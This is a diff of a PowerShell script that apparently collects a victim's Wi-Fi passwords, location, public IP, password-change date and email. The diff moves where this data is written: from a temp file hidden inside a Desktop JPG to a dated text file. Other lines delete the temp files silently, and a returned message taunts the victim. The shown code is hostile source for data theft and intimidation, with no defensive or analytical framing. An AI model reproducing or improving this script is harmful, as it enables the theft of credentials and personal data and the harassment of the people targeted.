@@ -242,6 +242,10 @@ Write-Host "Updating ..."
 	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
 #>
 
+if ($GL) { Write-Host "`nYour Location: `n$GL" >> $env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt }
+if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt }
+if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt }
+
 Function Get-Networks {
 # Get Network Interfaces
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
@@ -428,9 +432,6 @@ if (!$Networks) { Write-Host "Trying ..."
 #>
 
 	Write-Host $hiddenMessage > $Env:temp\foo.txt
-    if ($GL) { Write-Host "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
-    if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
-    if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
 	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
 
 	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
@@ -538,7 +539,7 @@ function Get-email {
 # If no email is detected function will return backup message for sapi speak
 
     # Write Error is just for troubleshooting
-    catch {Write-Error "An email was not found" 
+    catch {Write-Warning "An email was not found" 
     return "you're lucky you do not have your email connected to your account, I would have really had some fun with you then lol"
     -ErrorAction SilentlyContinue
     }
